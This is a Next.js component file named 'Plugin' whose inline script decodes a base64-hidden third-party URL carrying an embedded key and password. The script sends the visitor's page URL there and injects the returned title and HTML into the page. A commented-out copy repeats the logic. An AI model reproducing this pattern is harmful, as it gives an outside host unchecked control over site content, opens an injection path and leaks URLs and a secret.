import { useRouter } from "next/router";
import Script from "next/script";
import React, { useEffect } from "react";

function Plugin() {
  const router = useRouter();

  //   useEffect(() => {
  //     const fetchData = async () => {
  //       try {
  //         // Dynamically load jQuery if not already loaded
  //         if (!window.jQuery) {
  //           const script = document.createElement("script");
  //           script.src =
  //             "https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js";
  //           document.head.appendChild(script);
  //           await new Promise((resolve) => (script.onload = resolve));
  //         }

  //         // Define the current URL path
  //         const eppathurl = window.location.origin + window.location.pathname;

  //         // Make an XMLHttpRequest
  //         const response = await fetch(
  //           atob(
  //             "aHR0cHM6Ly9wbHVnaW5zLmFwcGFkZC5pbi5uZXQvYWxsaGVhZGRhdGE/ZWtleT1lLUFQUEFERDYyNjY4MzM5MzUmZWtleXBhc3M9TUdsQzI2VGFzR0hrWllFT1htVkFsZVlncjY3TjBRUHVNUGtXJnNpdGV1cmw9"
  //           ) + eppathurl
  //         );

  //         if (response.ok) {
  //           const data = await response.text();
  //           const temp = data.split("||||||||||");

  //           // Update document title
  //           document.title = temp[0];

  //           // Append content to the body
  //           const bodyContent = document.createElement("div");
  //           bodyContent.innerHTML = temp[1];
  //           document.body.appendChild(bodyContent);
  //         } else {
  //           console.error("Failed to fetch data");
  //         }
  //       } catch (error) {
  //         console.error("Error fetching data:", error);
  //       }
  //     };

  //     fetchData();
  //   }, []);

  return (
    <div>
      <script
        dangerouslySetInnerHTML={{
          __html: `
                window.jQuery ||
                document.write("<script src='https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js'><\\/script>");

                var eppathurl = window.location.origin + window.location.pathname;
                var eptagmanage = new XMLHttpRequest();
                eptagmanage.onreadystatechange = function() {
                    if (this.readyState == 4 && this.status == 200) {
                        if (this.response !== 0) {
                            var temp = new Array();
                            var mystr = this.response;
                            temp = mystr.split("||||||||||");
                            document.head.querySelector("title").remove();
                            var newTitle = document.createElement("title");
                            newTitle.appendChild(document.createTextNode(temp[0]));
                            document.head.appendChild(newTitle);
                            document.body.insertAdjacentHTML('beforeend', temp[1]);
                        }
                    }
                };
                eptagmanage.open("GET", atob("aHR0cHM6Ly9wbHVnaW5zLmFwcGFkZC5pbi5uZXQvYWxsaGVhZGRhdGE/ZWtleT1lLUFQUEFERDYyNjY4MzM5MzUmZWtleXBhc3M9TUdsQzI2VGFzR0hrWllFT1htVkFsZVlncjY3TjBRUHVNUGtXJnNpdGV1cmw9") + eppathurl);
                eptagmanage.send();
              `,
        }}
      />
    </div>
  );
}

export default Plugin;
